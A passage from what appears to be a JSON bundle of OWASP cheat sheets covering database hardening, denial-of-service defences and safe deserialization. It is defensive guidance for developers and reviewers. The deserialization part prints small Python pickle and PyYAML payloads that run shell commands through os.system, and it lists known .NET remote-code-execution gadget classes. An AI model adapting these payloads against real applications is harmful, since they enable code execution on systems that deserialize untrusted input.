Protection](Transport_Layer_Protection_Cheat_Sheet.md) and [TLS Cipher String](TLS_Cipher_String_Cheat_Sheet.md) Cheat Sheets contain further guidance on securely configuring TLS.\r\n\r\n## Authentication\r\n\r\nThe database should be configured to always require authentication, including connections from the local server. Database accounts should be:\r\n\r\n- Protected with strong and unique passwords.\r\n- Used by a single application or service.\r\n- Configured with the minimum permissions required as discussed in the [permissions section below](#permissions).\r\n\r\nAs with any system that has its own user accounts, the usual account management processes should be followed, including:\r\n\r\n- Regular reviews of the accounts to ensure that they are still required.\r\n- Regular reviews of permissions.\r\n- Removing user accounts when an application is decommissioned.\r\n- Changing the passwords when staff leave, or there is reason to believe that they may have been compromised.\r\n\r\nFor Microsoft SQL Server, consider the use of [Windows or Integrated-Authentication](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/authentication-in-sql-server), which uses existing Windows accounts rather than SQL Server accounts. This also removes the requirement to store credentials in the application, as it will connect using the credentials of the Windows user it is running under. The [Windows Native Authentication Plugins](https://dev.mysql.com/doc/connector-net/en/connector-net-programming-authentication-windows-native.html) provides similar functionality for MySQL.\r\n\r\n### Storing Database Credentials\r\n\r\nDatabase credentials should never be stored in the application source code, especially if they are unencrypted. Instead, they should be stored in a configuration file that:\r\n\r\n- Is outside of the webroot.\r\n- Has appropriate permissions so that it can only be read by the required user(s).\r\n- Is not checked into source code repositories.\r\n\r\nWhere possible, these credentials should also be encrypted or otherwise protected using built-in functionality, such as the `web.config` encryption available in [ASP.NET](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/connection-strings-and-configuration-files#encrypting-configuration-file-sections-using-protected-configuration).\r\n\r\n## Permissions\r\n\r\nThe permissions assigned to database user accounts should be based on the principle of least privilege (i.e, the accounts should only have the minimal permissions required for the application to function). This can be applied at a number of increasingly granular levels depending on the functionality available in the database. The following steps should be applicable to all environments:\r\n\r\n- Do not use the built-in `root`, `sa` or `SYS` accounts.\r\n- Do not grant the account administrative rights over the database instance.\r\n- Only allow the account to connect from allowed hosts.\r\n    - This would often be `localhost` or the address of the application server.\r\n- Only grant the account access to the specific databases it needs.\r\n    - Development, UAT and Production environments should all use separate databases and accounts.\r\n- Only grant the required permissions on the databases.\r\n    - Most applications would only need `SELECT`, `UPDATE` and `DELETE` permissions.\r\n    - The account should not be the owner of the database as this can lead to privilege escalation vulnerabilities.\r\n- Avoid using database links or linked servers.\r\n    - Where they are required, use an account that has been granted access to only the minimum databases, tables, and system privileges required.\r\n\r\nFor more security-critical applications, it is possible to apply permissions at more granular levels, including:\r\n\r\n- Table-level permissions.\r\n- Column-level permissions.\r\n- Row-level permissions\r\n- Blocking access to the underlying tables, and requiring all access through restricted [views](https://en.wikipedia.org/wiki/View_(SQL)).\r\n\r\n## Database Configuration and Hardening\r\n\r\nThe underlying operating system for the database server should be hardened in the same way as any other server, based on a secure baseline such as the [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/) or the [Microsoft Security Baselines](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-security-baselines).\r\n\r\nThe database application should also be properly configured and hardened. The following principles should apply to any database application and platform:\r\n\r\n- Install any required security updates and patches.\r\n- Configure the database services to run under a low privileged user account.\r\n- Remove any default accounts and databases.\r\n- Store [transaction logs](https://en.wikipedia.org/wiki/Transaction_log) on a separate disk to the main database files.\r\n- Configure a regular backup of the database.\r\n    - Ensure that the backups are protected with appropriate permissions, and ideally encrypted.\r\n\r\nThe following sections gives some further recommendations for specific database software, in addition to the more general recommendations given above.\r\n\r\n### Microsoft SQL Server\r\n\r\n- Disable `xp_cmdshell`, `xp_dirtree` and other stored procedures that are not required.\r\n- Disable Common Language Runtime (CLR) execution.\r\n- Disable the SQL Browser service.\r\n- Disable [Mixed Mode Authentication](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver15) unless it is required.\r\n- Ensure that the sample [Northwind and AdventureWorks databases](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/linq/downloading-sample-databases) have been removed.\r\n- See Microsoft's articles on [securing SQL Server](https://docs.microsoft.com/en-us/sql/relational-databases/security/securing-sql-server).\r\n\r\n### MySQL and MariaDB\r\n\r\n- Run the `mysql_secure_installation` script to remove the default databases and accounts.\r\n- Disable the [FILE](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file) privilege for all users to prevent them reading or writing files.\r\n- See the [Oracle MySQL](https://dev.mysql.com/doc/refman/8.0/en/security-guidelines.html) and [MariaDB](https://mariadb.com/kb/en/library/securing-mariadb/) hardening guides.\r\n\r\n### PostgreSQL\r\n\r\n- See the [PostgreSQL Server Setup and Operation documentation](https://www.postgresql.org/docs/current/runtime.html) and the older [Security documentation](https://www.postgresql.org/docs/7.0/security.htm).\r\n\r\n### MongoDB\r\n\r\n- See the [MongoDB security checklist](https://docs.mongodb.com/manual/administration/security-checklist/).\r\n\r\n### Redis\r\n\r\n- See the [Redis security guide](https://redis.io/topics/security).\r\n"
    },
    {
      "Denial_of_Service_Cheat_Sheet.md": "# Denial of Service Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis sheet is focused on providing an overall, common overview with an informative, straight to the point guidance to propose angles on how to battle denial of service (DoS) attacks on different layers. It is by no means complete, however, it should serve as an indicator to inform the reader and to introduce a workable methodology to tackle this issue.\r\n\r\n### Fundamentals\r\n\r\nConsidering that anti-DoS approaches are not one-step solutions, it becomes apparent that, for it to be implemented, it's necessary to involve different profiles within your organization to assess the actual situation and to apply countermeasures accordingly. These profiles are: developers and architects in the area of application and infrastructure.\r\n\r\nKey concepts within information security evolve around criteria or properties such as the [CIA triad](https://whatis.techtarget.com/definition/Confidentiality-integrity-and-availability-CIA). The letter **A**, which stands for availability, is our focal point. The core essence of a DoS is to affect, by any means, the availability of instances or objects and to eventually render it inaccessible. Thus, for any information system to serve its purpose, it must be available at any time. Hence why every computing system within the interoperability flow must function correctly to achieve that.\r\n\r\nTo remain resilient and resistant, it's imperative - and suggested - to outline and to conduct a thorough analysis on components within your inventory based on functionality, architecture and performance (i.e. application-wise, infrastructure and network related).\r\n\r\n[object Promise]\r\n\r\nThe outcome of this research should identify potential causes of a DoS which highlight single point of failures ranging from programming related errors to resource exhaustion..\r\n\r\nFrom a prevention point of view, it's important to have a clear picture on how to tackle your appropriate components to address the issue at stake (e.g. bottlenecks, etc.). That's why a solid understanding of your environment is essential to develop a suitable defence mechanism. These could be aligned with:\r\n\r\n1. scaling options (**up** = inner hardware components, **out** = the number of complete components)\r\n2. existing conceptual / logical techniques (such as applying redundancy measurements, bulk-heading, etc. - which expands your in-house capabilities)\r\n3. a cost analysis applied to your situation\r\n\r\nWithin this document we will adhere to a particular guidance structure to illustrate on how to analyse this subject based on your situation. It is by no means a complete approach but we ought to create fundamental blocks which should be utilized to assist you in constructing anti-DoS concepts fitting to your needs.\r\n\r\n### General Categories and Basic Controls\r\n\r\nIn this cheat sheet, we will adhere to the DDOS classification as documented by CERT-EU. The document categorizes the 7 OSI model layers into three main attack categories, namely application, Session and Network.\r\n\r\n**TODO:** Add Diagram\r\n\r\nApplication attacks focus on rendering applications unavailable by exhausting resources or by making it unusable in a functional way. Session (or protocol) attacks focus on consuming server resources, or resources of intermediary equipment like firewalls and load-balancers. Network (or volumetric) attacks focus on saturating the bandwidth of the network resource. It is important to understand that each of these three attack categories needs to be considered when designing a DoS resilient solution.\r\n\r\nNote that OSI model layer 1 and 2 are not included in this categorization. In the spirit of providing a complete overview of all DoS type of attacks, we will shortly discuss these layers and how DoS applies to them.\r\n\r\nThe physical layer consists of the networking hardware transmission technologies of a network. It is a fundamental layer underlying the logical data structures of the higher-level functions in a network. Typical DoS scenarios are destruction, obstruction, malfunction. An example is a case where a Georgian elderly woman sliced through an underground cable, resulting in loss of internet for the whole of Armenia.\r\n\r\nThe data layer is the protocol layer that transfers data between adjacent network nodes in a wide area network (WAN) or between nodes on the same local area network (LAN) segment. Typical DoS scenarios are MAC flooding (targeting switch MAC tables) and ARP poisoning.\r\n\r\nIn MAC flooding attacks, a switch is flooded with packets, each with a different source MAC address. The intention is to consume the limited memory used by a switch to store the MAC and physical port translation table (MAC table). The result is that valid MAC addresses are purged and the switch enters a fail-over mode where it will act as a network hub. All data is then forwarded to all ports, resulting in a data leakage. TODO impact in relation to DoS TODO document compact remediation\r\n\r\nIn ARP poisoning attacks a malicious actor sends spoofed ARP (Address Resolution Protocol) messages over the wire. The result is that the attacker's MAC address can be linked to the IP address of a legitimate device on the network. This allows an attacker to intercept, modify or stop data in transit, that was intended for the victim IP address. The ARP protocol is specific to the local area network and could cause a DoS on the wire communication.\r\n\r\nPacket filtering technology can be used to inspect packets in transit to identify and block offending ARP packets. Another approach is to use static ARP tables but they prove difficult to be maintained.\r\n\r\n## Application attacks\r\n\r\nApplication layer attacks focus on rendering applications unavailable by exhausting resources or by making it unusable in a functional way. These attacks do not have to consume the network bandwidth to be effective. Rather they place an operational strain on the application server in such a way that the server becomes unavailable, unusable or non-functional. All attacks exploiting weaknesses on OSI layer 7 protocol stack are generally categorised as application attacks. They are most challenging to identify/mitigate.\r\n\r\n**TODO:** List all attacks per category. Because we cannot map remediations one on one with an attack vector, we will first need to list them before discussing the action points\r\n\r\n**Slow HTTP** is a DoS attack type where HTTP requests are send very slow and fragmented, one at a time. Until the HTTP request was fully delivered, the server will keep resources stalled while waiting for the missing incoming data. At one moment, the server will reach the maximum concurrent connection pool, resulting in a DoS. From an attacker's perspective, slow HTTP attacks are cheap to perform because they require minimal resources.\r\n\r\n### Software Design Concepts\r\n\r\n- **Cheap validation first**: Validation that is cheap in resources should be considered first. More (CPU, memory and bandwidth) expensive validation should be performed afterward. The reason is obvious, we want to reduce impact on these resources as soon as possible.\r\n- **Graceful Degradation** is the ability of maintaining functionality when portions of a system or application break. DoS caused by application termination is a widespread problem. Implementing a fault tolerant design enables a system or application to continue its intended operation, possibly at a reduced level, rather than failing completely, when some part of the system fails. Graceful degradation is a core concept to follow during application design phase, in order to limit impact of DoS.\r\n- **Prevent single point of failure**\r\n- **Avoid highly CPU consuming operations**\r\n- **Keep Queues short**\r\n- **Handle Exceptions**\r\n- **Protect overflow and underflow**\r\n- **Threading**: Avoid operations which must wait for completion of large tasks to proceed. Asynchronous operations\r\n- Identify resource intensive pages and plan ahead.\r\n\r\n### Session\r\n\r\n- **Limit server side session time based on inactivity and a final timeout**: (resource exhaustion) While sessions timeout is most of the time discussed in relation to session security and preventing session hijacking, it is also an important measure to prevent resource exhaustion.\r\n- **Limit session bound information storage:** the less data is linked to a session, the less burden a user session has on webserver's performance.\r\n\r\n### Input validation\r\n\r\n- **Limit file upload size and extensions** (resource exhaustion) to prevent DoS on file space storage or other web application functions which will use the upload as input (e.g. image resizing, PDF creation, etc.)        - [Checklist](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload).\r\n- **Limit total request size** (resource exhaustion) to make it harder for resource consuming DoS attack to succeed.\r\n- **Prevent input based resource allocation** (resource exhaustion).\r\n- **Prevent input based function and threading interaction** (resource exhaustion). User input could influence how many times a function needs to be executed, or how intensive the CPU consumption becomes. Depending on (unfiltered) user input for resource allocation could allow a DoS scenario through resource exhaustion.\r\n- **Input based puzzles** like captchas or simple math problems are often used to 'protect' a web form. They serve a purpose to protect against functionality abuse. The classic example is a webform that will send out an email after posting the request. A captcha could then prevent the mailbox from getting flooded by a malicious attacker or spambot. Notice that this kind of technology will not help defend against DoS attacks.\r\n\r\n### Access control\r\n\r\n- **Authentication as a means to expose functionality**\r\n- **User lockout** is a scenario where an attacker can take advantage of the application security mechanisms to cause DoS by abusing the login failure.\r\n\r\n## Network attacks\r\n\r\n**TODO:** (Develop text) Attacks where network bandwidth gets saturation. Volumetric in nature. Amplification techniques make these attacks effective.\r\n\r\n**TODO:** (list attacks) NTP amplification, DNS amplification, UDP flooding, TCP flooding\r\n\r\n### Network Design Concepts\r\n\r\n- **Preventing single point of failure**\r\n- **Pooling**\r\n- **Caching** is the concept that data is stored so future requests for that data can be served faster. The more data is served via caching, to more resilient the application becomes to bandwidth exhaustion.\r\n- **Static resources hosting on a different domain** will reduce the number of http requests on the web application. Images and JavaScript are typical files that are loaded from a different domain.  \r\n\r\n### Rate limiting\r\n\r\nRate limiting is the process of controlling traffic rate from and to a server or component. It can be implemented on infrastructure as well as on an application level. Rate limiting can be based on (offending) IPs, on IP block lists, on geolocation, etc.\r\n\r\n- **Define a minimum ingress data rate limit**, and drop all connections below that rate. Note that if the rate limit is set too low, this could impact clients. Inspect the logs to establish a baseline of genuine traffic rate. (Protection against slow HTTP attacks)\r\n- **Define an absolute connection timeout**\r\n- **Define a maximum ingress data rate limit**, and drop all connections above that rate.\r\n- **Define a total bandwidth size limit** to prevent bandwidth exhaustion\r\n- **Define a load limit**, which specifies the number of users allowed to access any given resource at any given time.\r\n\r\n### ISP-Level remediations\r\n\r\n- **Filter invalid sender addresses using edge routers**, in accordance with RFC 2267, to filter out IP-spoofing attacks done with the goal of bypassing block lists.\r\n- **Check your ISP services in terms of DDOS beforehand** (support for multiple internet access points, enough bandwidth (xx-xxx Gbit/s) and special hardware for traffic analysis and defence on application level\r\n\r\n### Global-Level remediations: Commercial cloud filter services\r\n\r\n- Consider using a filter service in order to resist larger attacks (up to 500GBit/s)\r\n- **Filter services** support different mechanics to filter out malicious or non compliant traffic\r\n- **Comply with relevant data protection/privacy laws** - a lot of providers route traffic through USA/UK\r\n\r\n## Related Articles\r\n\r\n- [CERT-EU Whitepaper](http://cert.europa.eu/static/WhitePapers/CERT-EU-SWP_14_09_DDoS_final.pdf)\r\n"
    },
    {
      "Deserialization_Cheat_Sheet.md": "# Deserialization Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis article is focused on providing clear, actionable guidance for safely deserializing untrusted data in your applications.\r\n\r\n## What is Deserialization\r\n\r\n**Serialization** is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them for storage, or to send as part of communications.\r\n\r\n**Deserialization** is the reverse of that process, taking data structured in some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.\r\n\r\nHowever, many programming languages have native ways to serialize objects. These native formats usually offer more features than JSON or XML, including customizability of the serialization process.\r\n\r\nUnfortunately, the features of these native deserialization mechanisms can sometimes be repurposed for malicious effect when operating on untrusted data. Attacks against deserializers have been found to allow denial-of-service, access control, or remote code execution (RCE) attacks.\r\n\r\n## Guidance on Deserializing Objects Safely\r\n\r\nThe following language-specific guidance attempts to enumerate safe methodologies for deserializing data that can't be trusted.\r\n\r\n### PHP\r\n\r\n#### WhiteBox Review\r\n\r\nCheck the use of [unserialize()](https://www.php.net/manual/en/function.unserialize.php) function and review how the external parameters are accepted. Use a safe, standard data interchange format such as JSON (via `json_decode()` and `json_encode()`) if you need to pass serialized data to the user.\r\n\r\n### Python\r\n\r\n#### BlackBox Review\r\n\r\nIf the traffic data contains the symbol dot `.` at the end, it's very likely that the data was sent in serialization.\r\n\r\n#### WhiteBox Review\r\n\r\nThe following API in Python will be vulnerable to serialization attack. Search code for the pattern below.\r\n\r\n1. The uses of `pickle/c_pickle/_pickle` with `load/loads`:\r\n\r\n```python\r\nimport pickle\r\ndata = \"\"\" cos.system(S'dir')tR. \"\"\"\r\npickle.loads(data)\r\n```\r\n\r\n2. Uses of `PyYAML` with `load`:\r\n\r\n```python\r\nimport yaml\r\ndocument = \"!!python/object/apply:os.system ['ipconfig']\"\r\nprint(yaml.load(document))\r\n```\r\n\r\n3. Uses of `jsonpickle` with `encode` or `store` methods.\r\n\r\n### Java\r\n\r\nThe following techniques are all good for preventing attacks against deserialization against [Java's Serializable format](https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html).\r\n\r\nImplementation advices:\r\n\r\n- In your code, override the `ObjectInputStream#resolveClass()` method to prevent arbitrary classes from being deserialized. This safe behavior can be wrapped in a library like [SerialKiller](https://github.com/ikkisoft/SerialKiller).\r\n- Use a safe replacement for the generic `readObject()` method as seen here. Note that this addresses \"[billion laughs](https://en.wikipedia.org/wiki/Billion_laughs_attack)\" type attacks by checking input length and number of objects deserialized.\r\n\r\n#### WhiteBox Review\r\n\r\nBe aware of the following Java API uses for potential serialization vulnerability.\r\n\r\n1. `XMLdecoder` with external user defined parameters\r\n\r\n2. `XStream` with `fromXML` method (xstream version <= v1.4.6 is vulnerable to the serialization issue)\r\n\r\n3. `ObjectInputStream` with `readObject`\r\n\r\n4. Uses of `readObject`, `readObjectNoData`, `readResolve` or `readExternal`\r\n\r\n5. `ObjectInputStream.readUnshared`\r\n\r\n6. `Serializable`\r\n\r\n#### BlackBox Review\r\n\r\nIf the captured traffic data includes the following patterns, it may suggest that the data was sent in Java serialization streams:\r\n\r\n- `AC ED 00 05` in Hex\r\n- `rO0` in Base64\r\n- `Content-type` header of an HTTP response set to `application/x-java-serialized-object`\r\n\r\n#### Prevent Data Leakage and Trusted Field Clobbering\r\n\r\nIf there are data members of an object that should never be controlled by end users during deserialization or exposed to users during serialization, they should be declared as [the `transient` keyword](https://docs.oracle.com/javase/7/docs/platform/serialization/spec/serial-arch.html#7231) (section *Protecting Sensitive Information*).\r\n\r\nFor a class that defined as Serializable, the sensitive information variable should be declared as `private transient`.\r\n\r\nFor example, the class `myAccount`, the variables 'profit' and 'margin' were declared as transient to prevent them from being serialized.\r\n\r\n```java\r\npublic class myAccount implements Serializable\r\n{\r\n    private transient double profit; // declared transient\r\n\r\n    private transient double margin; // declared transient\r\n    ....\r\n```\r\n\r\n#### Prevent Deserialization of Domain Objects\r\n\r\nSome of your application objects may be forced to implement `Serializable` due to their hierarchy. To guarantee that your application objects can't be deserialized, a `readObject()` method should be declared (with a `final` modifier) which always throws an exception:\r\n\r\n```java\r\nprivate final void readObject(ObjectInputStream in) throws java.io.IOException {\r\n    throw new java.io.IOException(\"Cannot be deserialized\");\r\n}\r\n```\r\n\r\n#### Harden Your Own java.io.ObjectInputStream\r\n\r\nThe `java.io.ObjectInputStream` class is used to deserialize objects. It's possible to harden its behavior by subclassing it. This is the best solution if:\r\n\r\n- you can change the code that does the deserialization;\r\n- you know what classes you expect to deserialize.\r\n\r\nThe general idea is to override [`ObjectInputStream.html#resolveClass()`](http://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#resolveClass(java.io.ObjectStreamClass)) in order to restrict which classes are allowed to be deserialized.\r\n\r\nBecause this call happens before a `readObject()` is called, you can be sure that no deserialization activity will occur unless the type is one that you allow.\r\n\r\nA simple example is shown here, where the `LookAheadObjectInputStream` class is guaranteed to **not** deserialize any other type besides the `Bicycle` class:\r\n\r\n```java\r\npublic class LookAheadObjectInputStream extends ObjectInputStream {\r\n\r\n    public LookAheadObjectInputStream(InputStream inputStream) throws IOException {\r\n        super(inputStream);\r\n    }\r\n\r\n    /**\r\n    * Only deserialize instances of our expected Bicycle class\r\n    */\r\n    @Override\r\n    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {\r\n        if (!desc.getName().equals(Bicycle.class.getName())) {\r\n            throw new InvalidClassException(\"Unauthorized deserialization attempt\", desc.getName());\r\n        }\r\n        return super.resolveClass(desc);\r\n    }\r\n}\r\n```\r\n\r\nMore complete implementations of this approach have been proposed by various community members:\r\n\r\n- [NibbleSec](https://github.com/ikkisoft/SerialKiller) - a library that allows creating lists of classes that are allowed to be deserialized\r\n- [IBM](https://www.ibm.com/developerworks/library/se-lookahead/) - the seminal protection, written years before the most devastating exploitation scenarios were envisioned.\r\n- [Apache Commons IO classes](https://commons.apache.org/proper/commons-io/javadocs/api-2.5/org/apache/commons/io/serialization/ValidatingObjectInputStream.html)\r\n\r\n#### Harden All java.io.ObjectInputStream Usage with an Agent\r\n\r\nAs mentioned above, the `java.io.ObjectInputStream` class is used to deserialize objects. It's possible to harden its behavior by subclassing it. However, if you don't own the code or can't wait for a patch, using an agent to weave in hardening to `java.io.ObjectInputStream` is the best solution.\r\n\r\nGlobally changing `ObjectInputStream` is only safe for block-listing known malicious types, because it's not possible to know for all applications what the expected classes to be deserialized are. Fortunately, there are very few classes needed in the blocklist to be safe from all the known attack vectors, today.\r\n\r\nIt's inevitable that more \"gadget\" classes will be discovered that can be abused. However, there is an incredible amount of vulnerable software exposed today, in need of a fix. In some cases, \"fixing\" the vulnerability may involve re-architecting messaging systems and breaking backwards compatibility as developers move towards not accepting serialized objects.\r\n\r\nTo enable these agents, simply add a new JVM parameter:\r\n\r\n```text\r\n-javaagent:name-of-agent.jar\r\n```\r\n\r\nAgents taking this approach have been released by various community members:\r\n\r\n- [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)\r\n\r\nA similar, but less scalable approach would be to manually patch and bootstrap your JVM's ObjectInputStream. Guidance on this approach is available [here](https://github.com/wsargent/paranoid-java-serialization).\r\n\r\n#### Other Deserialization Libraries and Formats\r\n\r\nWhile the advice above is focused on [Java's Serializable format](https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html), there are a number of other libraries\r\nthat use other formats for deserialization. Many of these libraries may have similar security\r\nissues if not configured correctly. This section lists some of these libraries and\r\nrecommended configuration options to avoid security issues when deserializing untrusted data:\r\n\r\n**Can be used safely with default configuration:**\r\n\r\nThe following libraries can be used safely with default configuration:\r\n\r\n- **[fastjson2](https://github.com/alibaba/fastjson2)** (JSON) - can be used safely as long as\r\nthe [**autotype**](https://github.com/alibaba/fastjson2/wiki/fastjson2_autotype_cn) option is not turned on\r\n- **[jackson-databind](https://github.com/FasterXML/jackson-databind)** (JSON) - can be used safely as long\r\nas polymorphism is not used ([see blog post](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062))\r\n- **[Kryo v5.0.0+](https://github.com/EsotericSoftware/kryo)** (custom format) - can be used safely\r\nas long as class registration is not turned **off** ([see documentation](https://github.com/EsotericSoftware/kryo#optional-registration)\r\nand [this issue](https://github.com/EsotericSoftware/kryo/issues/929))\r\n- **[YamlBeans v1.16+](https://github.com/EsotericSoftware/yamlbeans)** (YAML) - can be used safely\r\nas long as the **UnsafeYamlConfig** class isn't used (see [this commit](https://github.com/EsotericSoftware/yamlbeans/commit/b1122588e7610ae4e0d516c50d08c94ee87946e6))\r\n    - _NOTE: because these versions are not available in Maven Central,\r\n[a fork exists](https://github.com/Contrast-Security-OSS/yamlbeans) that can be used instead._\r\n- **[XStream v1.4.17+](https://x-stream.github.io/)** (JSON and XML) - can be used safely\r\nas long as the allowlist and other security controls are not relaxed ([see documentation](https://x-stream.github.io/security.html))\r\n\r\n**Requires configuration before can be used safely:**\r\n\r\nThe following libraries require configuration options to be set before they can be used safely:\r\n\r\n- **[fastjson v1.2.68+](https://github.com/alibaba/fastjson)** (JSON) - cannot be used safely unless\r\nthe [**safemode**](https://github.com/alibaba/fastjson/wiki/fastjson_safemode_en) option is turned on, which disables\r\ndeserialization of any class ([see documentation](https://github.com/alibaba/fastjson/wiki/enable_autotype)).\r\nPrevious versions are not safe.\r\n- **[json-io](https://github.com/jdereg/json-io)** (JSON) - cannot be used safely since the use of **@type** property in\r\nJSON allows deserialization of any class. Can only be used safely in following situations:\r\n    - In [non-typed mode](https://github.com/jdereg/json-io/blob/master/user-guide.md#non-typed-usage) using the **JsonReader.USE_MAPS** setting which turns off generic object deserialization\r\n    - [With a custom deserializer](https://github.com/jdereg/json-io/blob/master/user-guide.md#customization-technique-4-custom-serializer) controlling which classes get deserialized\r\n- **[Kryo < v5.0.0](https://github.com/EsotericSoftware/kryo)** (custom format) - cannot be used safely unless class registration is turned **on**,\r\nwhich disables deserialization of any class ([see documentation](https://github.com/EsotericSoftware/kryo#optional-registration)\r\nand [this issue](https://github.com/EsotericSoftware/kryo/issues/929))\r\n    - _NOTE: other wrappers exist around Kryo such as [Chill](https://github.com/twitter/chill), which may also have class registration\r\nnot required by default regardless of the underlying version of Kryo being used_\r\n- **[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/src)** (YAML) - cannot be used safely unless\r\nthe **org.yaml.snakeyaml.constructor.SafeConstructor** class is used, which disables\r\ndeserialization of any class ([see docs](https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE-2022-1471))\r\n\r\n**Cannot be used safely:**\r\n\r\nThe following libraries are either no longer maintained or cannot be used safely with untrusted input:\r\n\r\n- **[Castor](https://github.com/castor-data-binding/castor)** (XML) - appears to be abandoned with no commits since 2016\r\n- **[fastjson < v1.2.68](https://github.com/alibaba/fastjson)** (JSON) - these versions allows deserialization of any class\r\n([see documentation](https://github.com/alibaba/fastjson/wiki/enable_autotype))\r\n- **[XMLDecoder in the JDK](https://docs.oracle.com/javase/8/docs/api/java/beans/XMLDecoder.html)** (XML) - _\"close to impossible to securely deserialize Java objects in this format from untrusted inputs\"_\r\n(\"Red Hat Defensive Coding Guide\", [end of section 2.6.5](https://redhat-crypto.gitlab.io/defensive-coding-guide/#sect-Defensive_Coding-Tasks-Serialization-XML))\r\n- **[XStream < v1.4.17](https://x-stream.github.io/)** (JSON and XML) - these versions allows deserialization of any class (see [documentation](https://x-stream.github.io/security.html#explicit))\r\n- **[YamlBeans < v1.16](https://github.com/EsotericSoftware/yamlbeans)** (YAML) - these versions allows deserialization of any class\r\n(see [this document](https://github.com/Contrast-Security-OSS/yamlbeans/blob/main/SECURITY.md))\r\n\r\n### .Net CSharp\r\n\r\n#### WhiteBox Review\r\n\r\nSearch the source code for the following terms:\r\n\r\n1. `TypeNameHandling`\r\n2. `JavaScriptTypeResolver`\r\n\r\nLook for any serializers where the type is set by a user controlled variable.\r\n\r\n#### BlackBox Review\r\n\r\nSearch for the following base64 encoded content that starts with:\r\n\r\n```text\r\nAAEAAAD/////\r\n```\r\n\r\nSearch for content with the following text:\r\n\r\n1. `TypeObject`\r\n2. `$type:`\r\n\r\n#### General Precautions\r\n\r\nMicrosoft has stated that the `BinaryFormatter` type is dangerous and cannot be secured. As such, it should not be used. Full details are in the [BinaryFormatter security guide](https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide).\r\n\r\nDon't allow the datastream to define the type of object that the stream will be deserialized to. You can prevent this by for example using the `DataContractSerializer` or `XmlSerializer` if at all possible.\r\n\r\nWhere `JSON.Net` is being used make sure the `TypeNameHandling` is only set to `None`.\r\n\r\n```csharp\r\nTypeNameHandling = TypeNameHandling.None\r\n```\r\n\r\nIf `JavaScriptSerializer` is to be used then do not use it with a `JavaScriptTypeResolver`.\r\n\r\nIf you must deserialise data streams that define their own type, then restrict the types that are allowed to be deserialized. One should be aware that this is still risky as many native .Net types potentially dangerous in themselves. e.g.\r\n\r\n```csharp\r\nSystem.IO.FileInfo\r\n```\r\n\r\n`FileInfo` objects that reference files actually on the server can when deserialized, change the properties of those files e.g. to read-only, creating a potential denial of service attack.\r\n\r\nEven if you have limited the types that can be deserialised remember that some types have properties that are risky. `System.ComponentModel.DataAnnotations.ValidationException`, for example has a property `Value` of type `Object`. if this type is the type allowed for deserialization then an attacker can set the `Value` property to any object type they choose.\r\n\r\nAttackers should be prevented from steering the type that will be instantiated. If this is possible then even `DataContractSerializer` or `XmlSerializer` can be subverted e.g.\r\n\r\n```csharp\r\n// Action below is dangerous if the attacker can change the data in the database\r\nvar typename = GetTransactionTypeFromDatabase();\r\n\r\nvar serializer = new DataContractJsonSerializer(Type.GetType(typename));\r\n\r\nvar obj = serializer.ReadObject(ms);\r\n```\r\n\r\nExecution can occur within certain .Net types during deserialization. Creating a control such as the one shown below is ineffective.\r\n\r\n```csharp\r\nvar suspectObject = myBinaryFormatter.Deserialize(untrustedData);\r\n\r\n//Check below is too late! Execution may have already occurred.\r\nif (suspectObject is SomeDangerousObjectType)\r\n{\r\n    //generate warnings and dispose of suspectObject\r\n}\r\n```\r\n\r\nFor `JSON.Net` it is possible to create a safer form of allow-list control using a custom `SerializationBinder`.\r\n\r\nTry to keep up-to-date on known .Net insecure deserialization gadgets and pay special attention where such types can be created by your deserialization processes. **A deserializer can only instantiate types that it knows about**.\r\n\r\nTry to keep any code that might create potential gadgets separate from any code that has internet connectivity. As an example `System.Windows.Data.ObjectDataProvider` used in WPF applications is a known gadget that allows arbitrary method invocation. It would be risky to have this a reference to this assembly in a REST service project that deserializes untrusted data.\r\n\r\n#### Known .NET RCE Gadgets\r\n\r\n- `System.Configuration.Install.AssemblyInstaller`\r\n- `System.Activities.Presentation.WorkflowDesigner`\r\n- `System.Windows.ResourceDictionary`\r\n- `System.Windows.Data.ObjectDataProvider`\r\n- `System.Windows.Forms.BindingSource`\r\n- `Microsoft.Exchange.Management.SystemManager.WinForms.ExchangeSettingsProvider`\r\n- `System.Data.DataViewManager, System.Xml.XmlDocument/XmlDataDocument`\r\n- `System.Management.Automation.PSObject`\r\n\r\n## Language-Agnostic Methods for Deserializing Safely\r\n\r\n### Using Alternative Data Formats\r\n\r\nA great reduction of risk is achieved by avoiding native (de)serialization formats. By switching to a pure data format like JSON or XML, you lessen the chance of custom deserialization logic being repurposed towards malicious ends.\r\n\r\nMany applications rely on a [data-transfer object pattern](https://en.wikipedia.org/wiki/Data_transfer_object) that involves creating a separate domain of objects for the explicit purpose data transfer. Of course, it's still possible that the application will make security mistakes after a pure data object is parsed.\r\n\r\n### Only Deserialize Signed Data\r\n\r\nIf the application knows before deserialization which messages will need to be processed, they could sign them as part of the serialization process. The application could then to choose not to deserialize any message which didn't have an authenticated signature.\r\n\r\n## Mitigation Tools/Libraries\r\n\r\n- [Java secure deserialization library](https://github.com/ikkisoft/SerialKiller)\r\n- [SWAT](https://github.com/cschneider4711/SWAT) (Serial Whitelist Application Trainer)\r\n- [NotSoSerial](https://github.com/kantega/notsoserial)\r\n\r\n## Detection Tools\r\n\r\n- [Java deserialization cheat sheet aimed at pen 